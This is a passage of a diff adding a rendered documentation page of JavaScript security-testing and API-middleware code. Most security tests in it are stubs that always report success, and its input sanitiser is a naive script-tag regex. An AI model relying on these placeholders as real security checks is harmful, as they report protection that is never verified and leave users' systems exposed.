+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Brute Force Protection</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testBruteForceProtection</span> <span class="p">},</span>
+      <span class="p">];</span>
+      
+      <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="p">[];</span>
+      
+      <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">test</span> <span class="k">of</span> <span class="nx">tests</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">test</span><span class="p">.</span><span class="nx">test</span><span class="p">();</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">name</span><span class="p">:</span> <span class="nx">test</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="nx">result</span><span class="p">,</span>
+            <span class="na">details</span><span class="p">:</span> <span class="nx">result</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">Passed</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">Failed</span><span class="dl">'</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">name</span><span class="p">:</span> <span class="nx">test</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+            <span class="na">details</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      
+      <span class="k">return</span> <span class="nx">results</span><span class="p">;</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Test data encryption</span>
+    <span class="na">testDataEncryption</span><span class="p">:</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">tests</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">AES Encryption</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testAESEncryption</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Key Management</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testKeyManagement</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Secure Storage</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testSecureStorage</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Data Integrity</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testDataIntegrity</span> <span class="p">},</span>
+      <span class="p">];</span>
+      
+      <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="p">[];</span>
+      
+      <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">test</span> <span class="k">of</span> <span class="nx">tests</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">test</span><span class="p">.</span><span class="nx">test</span><span class="p">();</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">name</span><span class="p">:</span> <span class="nx">test</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="nx">result</span><span class="p">,</span>
+            <span class="na">details</span><span class="p">:</span> <span class="nx">result</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">Passed</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">Failed</span><span class="dl">'</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">name</span><span class="p">:</span> <span class="nx">test</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+            <span class="na">details</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      
+      <span class="k">return</span> <span class="nx">results</span><span class="p">;</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Test network security</span>
+    <span class="na">testNetworkSecurity</span><span class="p">:</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">tests</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Certificate Pinning</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testCertificatePinning</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">TLS Configuration</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testTLSConfiguration</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">API Security</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testAPISecurity</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Request Validation</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testRequestValidation</span> <span class="p">},</span>
+      <span class="p">];</span>
+      
+      <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="p">[];</span>
+      
+      <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">test</span> <span class="k">of</span> <span class="nx">tests</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">test</span><span class="p">.</span><span class="nx">test</span><span class="p">();</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">name</span><span class="p">:</span> <span class="nx">test</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="nx">result</span><span class="p">,</span>
+            <span class="na">details</span><span class="p">:</span> <span class="nx">result</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">Passed</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">Failed</span><span class="dl">'</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">name</span><span class="p">:</span> <span class="nx">test</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+            <span class="na">details</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      
+      <span class="k">return</span> <span class="nx">results</span><span class="p">;</span>
+    <span class="p">},</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="c1">// Test functions</span>
+<span class="kd">const</span> <span class="nx">testInput</span> <span class="o">=</span> <span class="k">async</span> <span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Simulate input validation test</span>
+  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="nx">input</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;script.*</span><span class="se">?</span><span class="sr">&gt;.*</span><span class="se">?</span><span class="sr">&lt;</span><span class="se">\/</span><span class="sr">script&gt;/gi</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">sanitized</span> <span class="o">===</span> <span class="nx">input</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">sanitized</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">vulnerable</span><span class="dl">'</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testWeakPassword</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test weak password detection</span>
+  <span class="kd">const</span> <span class="nx">weakPasswords</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">123456</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">qwerty</span><span class="dl">'</span><span class="p">];</span>
+  <span class="kd">const</span> <span class="nx">strongPasswords</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Str0ng!P@ssw0rd</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">MyS3cur3P@ss!</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">C0mpl3x!ty123</span><span class="dl">'</span><span class="p">];</span>
+  
+  <span class="c1">// Simulate password strength check</span>
+  <span class="k">return</span> <span class="nx">weakPasswords</span><span class="p">.</span><span class="nx">every</span><span class="p">(</span><span class="nx">pwd</span> <span class="o">=&gt;</span> <span class="nx">pwd</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+         <span class="nx">strongPasswords</span><span class="p">.</span><span class="nx">every</span><span class="p">(</span><span class="nx">pwd</span> <span class="o">=&gt;</span> <span class="nx">pwd</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">);</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testSessionTimeout</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test session timeout implementation</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testTokenExpiry</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test token expiry implementation</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testBruteForceProtection</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test brute force protection</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testAESEncryption</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test AES encryption</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testKeyManagement</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test key management</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testSecureStorage</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test secure storage</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testDataIntegrity</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test data integrity</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testCertificatePinning</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test certificate pinning</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testTLSConfiguration</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test TLS configuration</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testAPISecurity</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test API security</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">testRequestValidation</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="c1">// Test request validation</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Simulate test result</span>
+<span class="p">};</span>
+
+<span class="c1">// Export security testing functions</span>
+<span class="k">export</span> <span class="p">{</span>
+  <span class="nx">createSecurityTestingService</span><span class="p">,</span>
+  <span class="nx">testInput</span><span class="p">,</span>
+  <span class="nx">testWeakPassword</span><span class="p">,</span>
+  <span class="nx">testSessionTimeout</span><span class="p">,</span>
+  <span class="nx">testTokenExpiry</span><span class="p">,</span>
+  <span class="nx">testBruteForceProtection</span><span class="p">,</span>
+  <span class="nx">testAESEncryption</span><span class="p">,</span>
+  <span class="nx">testKeyManagement</span><span class="p">,</span>
+  <span class="nx">testSecureStorage</span><span class="p">,</span>
+  <span class="nx">testDataIntegrity</span><span class="p">,</span>
+  <span class="nx">testCertificatePinning</span><span class="p">,</span>
+  <span class="nx">testTLSConfiguration</span><span class="p">,</span>
+  <span class="nx">testAPISecurity</span><span class="p">,</span>
+  <span class="nx">testRequestValidation</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-security-implementation">🔒 <strong>Security Implementation</strong></h2>
+
+<h3 id="security-middleware"><strong>Security Middleware</strong></h3>
+
+<p><button onclick="copyCode(this)" class="copy-btn">📋 Copy</button></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Security middleware for API requests</span>
+<span class="kd">const</span> <span class="nx">createSecurityMiddleware</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="c1">// Request security middleware</span>
+    <span class="na">requestSecurity</span><span class="p">:</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="c1">// Validate request headers</span>
+        <span class="nx">validateRequestHeaders</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+        
+        <span class="c1">// Check rate limiting</span>
+        <span class="nx">checkRateLimit</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+        
+        <span class="c1">// Validate request signature</span>
+        <span class="nx">validateRequestSignature</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+        
+        <span class="c1">// Sanitize request data</span>
+        <span class="nx">sanitizeRequestData</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+        
+        <span class="nx">next</span><span class="p">();</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span>
+          <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Security validation failed</span><span class="dl">'</span><span class="p">,</span>
+          <span class="na">message</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
+        <span class="p">});</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Response security middleware</span>
+    <span class="na">responseSecurity</span><span class="p">:</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="c1">// Add security headers</span>
+        <span class="nx">addSecurityHeaders</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+        
+        <span class="c1">// Sanitize response data</span>
+        <span class="nx">sanitizeResponseData</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+        
+        <span class="c1">// Log security events</span>
+        <span class="nx">logSecurityEvent</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">);</span>
+        
+        <span class="nx">next</span><span class="p">();</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Response security middleware error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+        <span class="nx">next</span><span class="p">();</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Authentication middleware</span>
+    <span class="na">authentication</span><span class="p">:</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="c1">// Validate authentication token</span>
+        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">validateAuthToken</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+        
+        <span class="c1">// Check token expiry</span>
+        <span class="nx">checkTokenExpiry</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+        
+        <span class="c1">// Validate user permissions</span>
+        <span class="nx">validateUserPermissions</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
+        
+        <span class="nx">next</span><span class="p">();</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span>
+          <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Authentication failed</span><span class="dl">'</span><span class="p">,</span>
+          <span class="na">message</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
+        <span class="p">});</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="c1">// Validate request headers</span>
+<span class="kd">const</span> <span class="nx">validateRequestHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">requiredHeaders</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">user-agent</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">x-request-id</span><span class="dl">'</span><span class="p">];</span>
+  
+  <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">header</span> <span class="k">of</span> <span class="nx">requiredHeaders</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="nx">header</span><span class="p">])</span> <span class="p">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">`Missing required header: </span><span class="p">${</span><span class="nx">header</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Validate user agent</span>
+  <span class="kd">const</span> <span class="nx">userAgent</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">user-agent</span><span class="dl">'</span><span class="p">];</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">userAgent</span> <span class="o">||</span> <span class="nx">userAgent</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid user agent</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Validate content type</span>
+  <span class="kd">const</span> <span class="nx">contentType</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">content-type</span><span class="dl">'</span><span class="p">];</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">contentType</span> <span class="o">||</span> <span class="o">!</span><span class="nx">contentType</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid content type</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Check rate limiting</span>
+<span class="kd">const</span> <span class="nx">checkRateLimit</span> <span class="o">=</span> <span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">clientIP</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">ip</span><span class="p">;</span>
+  <span class="kd">const</span> <span class="nx">currentTime</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+  
+  <span class="c1">// Simple rate limiting implementation</span>
+  <span class="kd">const</span> <span class="nx">rateLimitWindow</span> <span class="o">=</span> <span class="mi">60000</span><span class="p">;</span> <span class="c1">// 1 minute</span>
+  <span class="kd">const</span> <span class="nx">maxRequests</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+  
+  <span class="c1">// In a real implementation, you would use Redis or similar</span>
+  <span class="c1">// This is a simplified example</span>
+  <span class="kd">const</span> <span class="nx">requestCount</span> <span class="o">=</span> <span class="nx">getRequestCount</span><span class="p">(</span><span class="nx">clientIP</span><span class="p">,</span> <span class="nx">currentTime</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="nx">requestCount</span> <span class="o">&gt;</span> <span class="nx">maxRequests</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Rate limit exceeded</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="nx">incrementRequestCount</span><span class="p">(</span><span class="nx">clientIP</span><span class="p">,</span> <span class="nx">currentTime</span><span class="p">);</span>
+<span class="p">};</span>
+
+<span class="c1">// Validate request signature</span>
+<span class="kd">const</span> <span class="nx">validateRequestSignature</span> <span class="o">=</span> <span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">x-signature</span><span class="dl">'</span><span class="p">];</span>
+  <span class="kd">const</span> <span class="nx">timestamp</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">x-timestamp</span><span class="dl">'</span><span class="p">];</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">signature</span> <span class="o">||</span> <span class="o">!</span><span class="nx">timestamp</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Missing request signature</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Check timestamp (prevent replay attacks)</span>
+  <span class="kd">const</span> <span class="nx">requestTime</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">timestamp</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">currentTime</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+  <span class="kd">const</span> <span class="nx">timeDiff</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">currentTime</span> <span class="o">-</span> <span class="nx">requestTime</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="nx">timeDiff</span> <span class="o">&gt;</span> <span class="mi">300000</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 5 minutes</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Request timestamp too old</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Validate signature</span>
+  <span class="kd">const</span> <span class="nx">expectedSignature</span> <span class="o">=</span> <span class="nx">calculateRequestSignature</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">signature</span> <span class="o">!==</span> <span class="nx">expectedSignature</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid request signature</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Sanitize request data</span>
+<span class="kd">const</span> <span class="nx">sanitizeRequestData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">request</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">sanitizeObject</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">query</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">request</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="nx">sanitizeObject</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">query</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">request</span><span class="p">.</span><span class="nx">params</span> <span class="o">=</span> <span class="nx">sanitizeObject</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">params</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Sanitize object</span>
+<span class="kd">const</span> <span class="nx">sanitizeObject</span> <span class="o">=</span> <span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">obj</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span> <span class="o">||</span> <span class="nx">obj</span> <span class="o">===</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
